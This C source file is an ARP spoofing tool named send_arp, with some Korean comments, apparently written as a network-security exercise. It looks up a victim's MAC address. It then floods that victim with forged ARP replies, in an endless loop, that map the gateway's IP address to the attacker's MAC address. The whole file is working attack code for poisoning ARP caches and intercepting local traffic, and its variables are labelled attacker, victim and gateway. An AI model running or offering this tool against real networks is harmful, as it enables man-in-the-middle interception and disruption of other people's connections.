#include <stdio.h>

#include <string.h>

#include <pcap.h>

#include <net/ethernet.h>

#include <arpa/inet.h>

#include <libnet.h>

#include <sys/socket.h>

#include <sys/ioctl.h>

#include <linux/if.h>

#include <netdb.h>

 

u_char my_mac[6] = {};				/* Attacker (MAC) Address */

u_char my_ip[4] = {};				/* Attacker Protocol (IP) Address */

u_char target_mac[6] = {};			/* Gateway (MAC) Address */

u_char target_ip[4] = {};			/* Gateway Protocol (IP) Address */

u_char sender_mac[6] = {};			/* Victim (MAC) Address */

u_char sender_ip[4] = {};			/* Victim Protocol (IP) Address */

u_char broadcast_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };

u_char default_mac[6] = { 0, };

 

struct eth_header {

	u_char eth_dmac[6];             /* ether destination (MAC) Address (6 Byte) */

	u_char eth_smac[6];             /* ether source (MAC) Address (6 Byte)*/

	u_short eth_type;               /* ether type (2 Byte) */

};

 

struct arp_header {

	u_short arp_hwtype;             /* Hardware Type (2 byte) */

	u_short arp_protype;            /* Protocol Type (2 Byte) */

	u_char arp_hlen;                /* Hardware Length (1 Byte) */

	u_char arp_plen;                /* Protocol Length (1 Byte) */

	u_short arp_opr;                /* Operation (2 Byte) */

	u_char arp_shwaddr[6];          /* Sender Hardware (MAC) Address (6 Byte) */

	u_char arp_sipaddr[4];          /* Sender Protocol(IP) Address (4 Byte) */

	u_char arp_thwaddr[6];          /* Target Hardware (MAC) Address (6 Byte) */

	u_char arp_tproaddr[4];         /* Target Protocol (IP) Address (4 Byte) */

};

 

struct eth_arp {

	eth_header eth;

	arp_header arph;

};

 

void read_ip(char * ipstr, u_char *ip) {

	int i = 0;

	u_char temp = 0;

	for (int k = 0;k < 4;k++) {

		temp = 0;

		while (ipstr[i] != '.' && ipstr[i] != 0) {

			temp *= 10;

			temp += (ipstr[i]-48);

			i++;

		}

		i++;

		printf("%d", temp);

		ip[k] = temp;

	}

}

 

int ip_comparison(u_char *ip1, u_char *ip2) {

	if ((ip1[0] == ip2[0] && ip1[1] == ip2[1] && ip1[2] == ip2[2] && ip1[3] == ip2[3]))

		return 1;

	else

		return 0;

}

 

eth_arp make_arp_packet(u_char *dmac, u_char *smac, u_short operation, u_char *sm, u_char *si, u_char *dm, u_char *di) {

	eth_header eth;									

	arp_header arph;

	memcpy(eth.eth_dmac, dmac, sizeof(eth.eth_dmac));

	memcpy(eth.eth_smac, smac, sizeof(eth.eth_smac));

	eth.eth_type = htons(ETH_P_ARP);

	arph.arp_hwtype = htons(ARPHRD_ETHER);

	arph.arp_protype = htons(ETH_P_IP);

	arph.arp_hlen = sizeof(eth.eth_dmac);

	arph.arp_plen = sizeof(arph.arp_sipaddr);

	arph.arp_opr = operation;

	memcpy(arph.arp_shwaddr, sm, sizeof(arph.arp_shwaddr));

	memcpy(arph.arp_sipaddr, si, sizeof(arph.arp_sipaddr));

	memcpy(arph.arp_thwaddr, dm, sizeof(arph.arp_thwaddr));

	memcpy(arph.arp_tproaddr, di, sizeof(arph.arp_tproaddr));

	eth_arp arp_packet;

	arp_packet.eth = eth;

	arp_packet.arph = arph;

	return arp_packet;

}

 

void get_my_info(char *dev) {

	struct ifreq my_info;

	int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	

	strcpy(my_info.ifr_name, dev);

	ioctl(sock, SIOCGIFHWADDR, &my_info);

	for (int i = 0; i < 6; i++) {

		my_mac[i] = (unsigned char)my_info.ifr_ifru.ifru_hwaddr.sa_data[i];

	}

 

	ioctl(sock, SIOCGIFADDR, &my_info);

	for (int i = 2; i < 6; ++i) {

		my_ip[i - 2] = (unsigned char)my_info.ifr_ifru.ifru_addr.sa_data[i];

	}

	close(sock);

}

 

int main(int argc, char* argv[])

{

	if (argc != 4)

	{

		printf("syntax: send_arp <interface> <sender ip> <target ip>\n");

		printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");

		return -1;

	}

	read_ip(argv[2], sender_ip);					/* 인자들 읽어들이기 */

	read_ip(argv[3], target_ip);

	char* dev = argv[1];

 

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle;

	get_my_info(dev);								/* 내 mac, ip 주소 얻어오기 */

 

 

	/* sender mac을 알아내기 위해 request arp패킷 생성 */

	eth_arp request = make_arp_packet(broadcast_mac, my_mac, htons(ARPOP_REQUEST), my_mac, my_ip, default_mac, sender_ip);

 

	if (!(handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf))) {

		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);

		return -1;

	}

 

	if (pcap_sendpacket(handle, (const u_char*)&request, (sizeof(request))) != 0)	/* arp request packet 전송 후 reply packet 캡쳐 */

	{

		printf("pcap_sendpacket error\n");

	}

	else

	{

		printf("arp packet for get sender mac address send\n");

	}

	while (true) {

		struct pcap_pkthdr* header;

		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;

		if (res == -1 || res == -2) break;

		printf("%u bytes captured\n", header->caplen);

		eth_arp captured_packet;

		memcpy(&captured_packet, packet, sizeof(captured_packet));

		printf("%d, %d, %d ,%d", (captured_packet.eth.eth_type == htons(ETH_P_ARP)), (captured_packet.arph.arp_opr == htons(ARPOP_REPLY)), (ip_comparison(captured_packet.arph.arp_sipaddr, target_ip)), ip_comparison(captured_packet.arph.arp_tproaddr, my_ip));

		if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REPLY) && ip_comparison(captured_packet.arph.arp_tproaddr,my_ip))

		{

			memcpy(sender_mac, captured_packet.eth.eth_smac, sizeof(sender_mac));

			printf("cature arp packet that has sender mac address\n");

			printf("sender mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

			break;

		}

	}

	eth_arp reply = make_arp_packet(sender_mac, my_mac, htons(ARPOP_REPLY), my_mac, target_ip, sender_mac, sender_ip);

	while (true) {

		if (pcap_sendpacket(handle, (const u_char*)&reply, (sizeof(reply))) != 0)

		{

			printf("pcap_sendpacket error\n");

		}

		else

		{

			printf("arp packet send\n");

		}

	}

}


